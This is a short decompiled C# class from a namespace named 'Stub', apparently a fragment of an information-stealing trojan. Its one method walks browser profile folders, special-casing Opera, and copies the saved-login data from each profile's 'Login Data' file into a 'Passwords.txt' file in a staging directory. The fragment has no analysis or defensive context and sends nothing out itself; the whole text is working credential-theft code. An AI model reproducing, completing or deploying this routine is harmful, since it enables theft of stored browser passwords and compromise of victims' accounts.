using System;
using System.IO;

namespace Stub
{
	// Token: 0x02000025 RID: 37
	public sealed class Class3
	{
		// Token: 0x06000068 RID: 104 RVA: 0x00004C04 File Offset: 0x00002E04
		public static void smethod_0(string String_0)
		{
			if (!Directory.Exists(String_0))
			{
				Directory.CreateDirectory(String_0);
			}
			foreach (string text in Class25.String_0)
			{
				string path = (!text.Contains("Opera Software")) ? (Class25.String_4 + text) : (Class25.String_3 + text);
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						String_0 + "\\" + Class2.smethod_5(text);
						Class14.smethod_7(Class21.smethod_0(str + "\\Login Data"), Class30.String_3 + "\\Passwords.txt");
					}
				}
			}
		}
	}
}
